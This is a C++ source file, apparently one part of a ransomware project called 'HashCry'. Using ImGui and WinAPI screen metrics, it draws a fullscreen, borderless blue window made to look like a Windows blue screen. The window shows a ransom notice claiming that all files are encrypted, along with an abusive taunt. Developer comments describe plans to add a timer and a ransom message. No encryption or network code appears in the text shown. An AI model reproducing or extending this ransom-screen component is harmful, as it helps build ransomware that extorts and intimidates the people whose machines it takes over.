#include "Drawing.h"
#include <chrono>
#include <iostream>

bool showMenu = true;
bool continueDrawing = true; // Flag to control whether to continue drawing or exit the function
std::chrono::time_point<std::chrono::steady_clock> startTime;

// -> creds for imgui https://github.com/adamhlt/ImGui-Standalone/
// -> ima do some moddification:
//  1. make full screen using winapi (GetSystemMetrics)
//  2. make look like a bsod + make timer and shit and message of ransomee : )
// HashCry on top!!!!!!!!

ImVec2 Drawing::vWindowSize = { 0.0f, 0.0f }; // Initialize to zero for dynamic calculation
LPCSTR Drawing::lpWindowName = "HashCry";
ImGuiWindowFlags Drawing::WindowFlags = ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove;
bool Drawing::bDraw = true;

void Drawing::Active()
{
	bDraw = true;
}

bool Drawing::isActive()
{
	return bDraw;
}

ImGuiStyle* style = &ImGui::GetStyle();
ImGuiIO* io = &ImGui::GetIO();


void Drawing::Draw()
{
    if (isActive())
    {
     
        // Calculate window size accounting for decorations
        const int borderWidth = GetSystemMetrics(SM_CXSIZEFRAME);
        const int borderHeight = GetSystemMetrics(SM_CYSIZEFRAME);
        const int titleBarHeight = GetSystemMetrics(SM_CYCAPTION);
        const int taskbarHeight = 40; // Adjust this value as needed for your taskbar height
        const int topExtra = 10; // Additional pixels on top
        ImVec2 screenDimensions = { static_cast<float>(GetSystemMetrics(SM_CXSCREEN)), static_cast<float>(GetSystemMetrics(SM_CYSCREEN)) };
        ImVec2 windowSize = { static_cast<float>(screenDimensions.x + borderWidth * 2), static_cast<float>(screenDimensions.y + titleBarHeight + borderHeight + taskbarHeight + topExtra) };

        // Set window position to top-left corner
        ImVec2 windowPos = { -static_cast<float>(borderWidth), -static_cast<float>(titleBarHeight + topExtra) };

        ImGui::SetNextWindowSize(windowSize, ImGuiCond_Once);
        ImGui::SetNextWindowPos(windowPos);
        ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(10.0f / 255.0f, 125.0f / 255.0f, 208.0f / 255.0f, 255.0f / 255.0f)); // Set window background to blue
        ImGui::Begin(lpWindowName, &bDraw, WindowFlags);
        {
            // Set background color
            ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.0f, 0.0f, 0.0f, 1.0f)); // Black background

            // draw smiley face
            ImGui::Text("");
            ImGui::Text("");
            ImGui::Text("                         ");
            ImGui::Text("                             ");
            ImGui::Text("                         ");
            ImGui::Text("                         ");
            ImGui::Text("                         ");
            ImGui::Text("                         ");
            ImGui::Text("                         ");

            ImGui::Text("");
            ImGui::Text("");

            // Set font size for specific text
            ImGui::SetWindowFontScale(1); // Set font scale to 2.0

            ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "                        Oops, looks like all your files are encryted! Dont worry because\n                        you can still get them back. Please wait 6 seconds for more info.");
            ImGui::Text("");

            ImGui::SetWindowFontScale(0.5); // Set font scale to 2.0

            // Large unhappy face
         //   ImGui::Text("                                                HashCry Ransomware v0.1");
            ImGui::Text("                                                HASHCRY_RANSOMWARE_FUCKED_YOU");

           //// BSOD-like text
           // ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "                        Oops, looks like all your files are encryted! Dont worry because\n                        you can still get them back. Please wait 10 seconds for more info.");
           // ImGui::Text("");

           // // Large unhappy face
           // ImGui::Text("");

            // Restore default font and background color
            ImGui::PopStyleColor();

         
          
        }
        ImGui::End();
    }

#ifdef _WINDLL
    if (GetAsyncKeyState(VK_INSERT) & 1)
        bDraw = !bDraw;
#endif
}

